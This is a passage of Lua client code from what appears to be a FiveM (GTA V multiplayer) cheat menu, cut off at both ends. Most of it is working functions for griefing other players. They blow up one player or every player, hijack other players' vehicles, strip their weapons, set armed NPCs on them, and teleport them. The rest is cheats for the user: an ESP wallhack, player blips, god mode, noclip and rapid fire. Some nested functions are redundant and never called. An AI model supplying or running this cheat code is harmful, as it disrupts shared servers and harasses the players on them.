        if not id or id == 0 then
            disposeFunc(iter)
            return
        end
        
        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = moveFunc(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
    end)
end












local RCCar = {}

-- RPPPwdjwdU23

RCCar.Start = function()
	if DoesEntityExist(RCCar.Entity) then return end

	RCCar.Spawn()

	RCCar.Tablet(true)

	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)

		RCCar.DrawInstructions(distanceCheck)
		RCCar.HandleKeys(distanceCheck)

		if distanceCheck <= 10000000.0 then
			if not NetworkHasControlOfEntity(RCCar.Driver) then
				NetworkRequestControlOfEntity(RCCar.Driver)
			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
				NetworkRequestControlOfEntity(RCCar.Entity)
			end
		else
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end
	end
end

RCCar.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		else
			RCCar.ToggleCamera(true)
		end
	end

	if distanceCheck <= 10000000.0 then
		if IsControlJustPressed(0, 73) then
			RCCar.Attach("pick")
		end
	end

	if distanceCheck < 10000000.0 then
	    if IsControlJustReleased(0, 108) then
		    local coos = GetEntityCoords(RCCar.Entity, true)
            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
		end
	end
end

RCCar.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Right",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Forward",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Reverse",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Left",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Delete",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explode",
		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Toggle Camera",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 10000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

-- 4x482

RCCar.Spawn = function()
	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })

	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)

	while not DoesEntityExist(RCCar.Entity) do
		Citizen.Wait(5)
	end

	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)

	SetEntityInvincible(RCCar.Driver, true)
	SetEntityVisible(RCCar.Driver, false)
	FreezeEntityPosition(RCCar.Driver, true)
	SetPedAlertness(RCCar.Driver, 0.0)
    SetVehicleNumberPlateText(RCCar.Entity, "K??DKONGEN#9999")
	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
   

	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
		Citizen.Wait(0)
	end

	RCCar.Attach("place")
end

RCCar.Attach = function(param)
	if not DoesEntityExist(RCCar.Entity) then
		return
	end
	
	RCCar.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(RCCar.Entity)
	elseif param == "pick" then
		if DoesCamExist(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		end

		RCCar.Tablet(false)

		DeleteVehicle(RCCar.Entity)
		DeleteEntity(RCCar.Driver)

		RCCar.UnloadModels()
	end
end

RCCar.Tablet = function(boolean)
	if boolean then



	
		Citizen.CreateThread(function()
			while DoesEntityExist(RCCar.TabletEntity) do
				Citizen.Wait(5)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(RCCar.TabletEntity)
	end
end

ConfigCamera = true

RCCar.ToggleCamera = function(boolean)
	if not ConfigCamera then return end

	if boolean then
		if not DoesEntityExist(RCCar.Entity) then return end 
		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end

		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)

		Citizen.CreateThread(function()
			while DoesCamExist(RCCar.Camera) do
				Citizen.Wait(5)

				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(RCCar.Camera)
	end
end

RCCar.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not RCCar.CachedModels then
			RCCar.CachedModels = {}
		end

		table.insert(RCCar.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(10)
			end    
		end
	end
end

RCCar.UnloadModels = function()
	for modelIndex = 1, #RCCar.CachedModels do
		local model = RCCar.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

function table.contains(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

function table.removekey(array, element)
    for i = 1, #array do
        if array[i] == element then
            table.remove(array, i)
        end
    end
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local function GetKeyboardInput(text)
	if not text then text = "Input" end
    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
		DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
        DisableAllControlActions(0)

        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
        Wait(0)
    end
    if (GetOnscreenKeyboardResult()) then
        local result = GetOnscreenKeyboardResult()
        Wait(0)
        return result
    end
end


function SpectatePlayer(id)
    local player = GetPlayerPed(id)
    if Spectating then
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(true, player)
    else
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(false, player)
    end
end


local function PossessVehicle(target)
    PossessingVeh = not PossessingVeh
    
    if not PossessingVeh then
        SetEntityVisible(PlayerPedId(), true, 0)
        SetEntityCoords(PlayerPedId(), oldPlayerPos)
        SetEntityCollision(PlayerPedId(), true, 1)
    else
        SpectatePlayer(selectedPlayer)
        ShowInfo("~b~Checking Player...")
        Wait(3000)
        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            SpectatePlayer(selectedPlayer)
            oldPlayerPos = GetEntityCoords(PlayerPedId())
            SetEntityVisible(PlayerPedId(), false, 0)
            SetEntityCollision(PlayerPedId(), false, 0)
        else
            SpectatePlayer(selectedPlayer)
            PossessingVeh = false
            ShowInfo("~r~Player not in a vehicle!  (Try again?)")
        end
        
        
        local Markerloc = nil


        Citizen.CreateThread(function()
            local ped = GetPlayerPed(target)
            local veh = GetVehiclePedIsIn(ped, 0)
            
            while PossessingVeh do
                
                DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
                DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
                DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
                
                local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                local vpos = GetEntityCoords(veh)
                local vf = GetEntityForwardVector(veh)
                local vrel = SubVectors(vpos, vf)
                
                SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
                
                RequestControlOnce(veh)
                
                if IsDisabledControlPressed(0, Keys["W"]) then
                    ApplyForce(veh, forward * 0.1)
                end
                
                if IsDisabledControlPressed(0, Keys["S"]) then
                    ApplyForce(veh, -(forward * 0.1))
                end
                
                if IsDisabledControlPressed(0, Keys["SPACE"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
                    PossessingVeh = false
                    SetEntityVisible(PlayerPedId(), true, 0)
                    SetEntityCoords(PlayerPedId(), oldPlayerPos)
                    SetEntityCollision(PlayerPedId(), true, 1)
                end
                
                Wait(0)
            end
        end)
    end
end

function GetWeaponNameFromHash(hash)
    for i = 1, #allweapons do
        if GetHashKey(allweapons[i]) == hash then
            return string.sub(allweapons[i], 8)
        end
    end
end

local function FixVeh(veh)
    SetVehicleEngineHealth(veh, 1000)
    SetVehicleFixed(veh)
end

local function ExplodePlayer(target)
    local ped = GetPlayerPed(target)
    local coords = GetEntityCoords(ped)
    for bs=0,9 do 
    AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
    end
end


    local function hejhej(target)
        local ped = GetPlayerPed(target)
        local coords = GetEntityCoords(ped)
        AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
        local function hejhej(target)
            local ped = GetPlayerPed(target)
            local coords = GetEntityCoords(ped)
            AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
            local function hejhej(target)
                local ped = GetPlayerPed(target)
                local coords = GetEntityCoords(ped)
                AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
            end    
        end 
    end      

local function ExplodeAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ExplodePlayer(i)
    end
end

local function ch_tptome(player,choice)
    vRPclient.getPosition(player,{},function(x,y,z)
        vRP.prompt(player,"Spiller ID:","",function(player,user_id)
            local tplayer = vRP.getUserSource(tonumber(user_id))
            if tplayer ~= nil then
                vRPclient.teleport(tplayer,{x,y,z})
            end
        end)
    end)
end


local function PedAttack(target, attackType)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
    if attackType == 1 then weparray = allweapons
    elseif attackType == 2 then weparray = meleeweapons
    elseif attackType == 3 then weparray = pistolweapons
    elseif attackType == 4 then weparray = heavyweapons
    end
    
    for k in EnumeratePeds() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
            local rand = math.ceil(math.random(#weparray))
            if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
            else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end


function ApplyShockwave(entity)
    local pos = GetEntityCoords(PlayerPedId())
    local coord = GetEntityCoords(entity)
    local dx = coord.x - pos.x
    local dy = coord.y - pos.y
    local dz = coord.z - pos.z
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end

local function DoForceFieldTick(radius)
    local player = PlayerPedId()
    local coords = GetEntityCoords(PlayerPedId())
    local playerVehicle = GetPlayersLastVehicle()
    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
    
    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
    
    for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            ApplyShockwave(k)
        end
    end
    
    for k in EnumeratePeds() do
        if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            SetPedRagdollOnCollision(k, true)
            SetPedRagdollForceFall(k)
            ApplyShockwave(k)
        end
    end
end

local function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)
        
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end

local function StripPlayer(target)
    local ped = GetPlayerPed(target)
    RemoveAllPedWeapons(ped, arwet)
end

local function StripAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        StripPlayer(i)
    end
end

local function KickFromVeh(target)
    local ped = GetPlayerPed(target)
    if IsPedInAnyVehicle(ped, false) then
        ClearPedTasksImmediately(ped)
    end
end

local function KickAllFromVeh(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        KickFromVeh(i)
    end
end

local function CancelAnimsAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ClearPedTasksImmediately(GetPlayerPed(plist[i]))
    end
end

local function RandomClothes(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
end

function FindPlayerWithName(string)
	for a = 0, 64 do
		if GetPlayerName(a) == string then
			return a
		end
	end
	return nil
end

local function GiveAllWeapons(target)
    local ped = GetPlayerPed(target)
    for i = 0, #allweapons do
        GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
    end
end

local function GiveAllPlayersWeapons(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        GiveAllWeapons(i)
    end
end

local function GiveWeapon(target, weapon)
    local ped = GetPlayerPed(target)
    GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
end

local function GiveMaxAmmo(target)
    local ped = GetPlayerPed(target)
    for i = 1, #allweapons do
        AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
    end
end

local function TeleportToPlayer(target)
    local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

local function TeleportToWaypoint()
    local entity = PlayerPedId()
    if IsPedInAnyVehicle(entity, false) then
        entity = GetVehiclePedIsUsing(entity)
    end
    local success = false
    local blipFound = false
    local blipIterator = GetBlipInfoIdIterator()
    local blip = GetFirstBlipInfoId(8)
    
    while DoesBlipExist(blip) do
        if GetBlipInfoIdType(blip) == 4 then
            cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))
            blipFound = true
            break
        end
        blip = GetNextBlipInfoId(blipIterator)
        Wait(0)
    end
    
    if blipFound then
        local groundFound = false
        local yaw = GetEntityHeading(entity)
        
        for i = 0, 1000, 1 do
            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
            SetEntityRotation(entity, 0, 0, 0, 0, 0)
            SetEntityHeading(entity, yaw)
            SetGameplayCamRelativeHeading(0)
            Wait(0)
            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                cz = ToFloat(i)
                groundFound = true
                break
            end
        end
        if not groundFound then
            cz = -300.0
        end
        success = true
    else
        ShowInfo('~r~Blip not found')
    end
    
    if success then
        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
        SetGameplayCamRelativeHeading(0)
        if IsPedSittingInAnyVehicle(PlayerPedId()) then
            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
            end
        end
    end

end

local function ToggleGodmode(tog)
    local ped = PlayerPedId()
    SetEntityProofs(ped, tog, tog, tog, tog, tog)
    SetPedCanRagdoll(ped, not tog)
end

local function ToggleNoclip()
    Noclipping = not Noclipping
    if Noclipping then
        SetEntityVisible(PlayerPedId(), false, false)
    else
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
        SetEntityVisible(PlayerPedId(), true, false)
    end
end

local function ToggleESP()
    ESPEnabled = not ESPEnabled
	local _,x,y = false, 0.0, 0.0
	
	Citizen.CreateThread(function()
		while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
			end
			Wait(ESPRefreshTime)
		end
	end)
	
    Citizen.CreateThread(function()
        while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
                if distance <= EspDistance then
                    local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                    local wepname = GetWeaponNameFromHash(wephash)
                    local vehname = "On Foot"
                    if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                        vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
                    end
                    if wepname == nil then wepname = "Unknown" end
                    DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
                    DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
                    local espstring1 = "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "~w~  |  ~b~Name: ~w~" .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: ~w~" .. math.floor(distance)
                    local espstring2 = "~b~Weapon: ~w~" .. wepname .. "  |  ~b~Vehicle: ~w~" .. vehname
                    DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
                    DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
                end
            end
            Wait(0)
        end
    end)
end


function ToggleBlips()
    BlipsEnabled = not BlipsEnabled
    
    if not BlipsEnabled then
        for i = 1, #pblips do
            RemoveBlip(pblips[i])
        end
    else
        
        Citizen.CreateThread(function()
            pblips = {}
            while BlipsEnabled do
                local plist = GetActivePlayers()
                table.removekey(plist, PlayerId())
                for i = 1, #plist do
                    if NetworkIsPlayerActive(plist[i]) then
                        ped = GetPlayerPed(plist[i])
                        pblips[i] = GetBlipFromEntity(ped)
                        if not DoesBlipExist(pblips[i]) then
                            pblips[i] = AddBlipForEntity(ped)
                            SetBlipSprite(pblips[i], 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(pblips[i])
                            if not GetEntityHealth(ped) then -- dead
                                if blipSprite ~= 274 then
                                    SetBlipSprite(pblips[i], 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(pblips[i], 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 16 then 
                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
                                        or vehModel == GetHashKey("lazer") then 
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(pblips[i], 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(pblips[i], 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 14 then 
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(pblips[i], 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
                                    or vehModel == GetHashKey("limo2") then 
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(pblips[i], 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("rhino") then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(pblips[i], 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif blipSprite ~= 1 then 
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                                

                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(pblips[i], passengers)
                                else
                                    HideNumberOnBlip(pblips[i])
                                end
                            else
                                

                                HideNumberOnBlip(pblips[i])
                                if blipSprite ~= 1 then 
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                            end
                            SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(pblips[i], plist[i])
                            SetBlipScale(pblips[i], 0.85)
                            

                            if IsPauseMenuActive() then
                                SetBlipAlpha(pblips[i], 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(pblips[i], distance)
                            end
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
end

local function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
end

local function ShootAt2(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5) - 1, arwet)
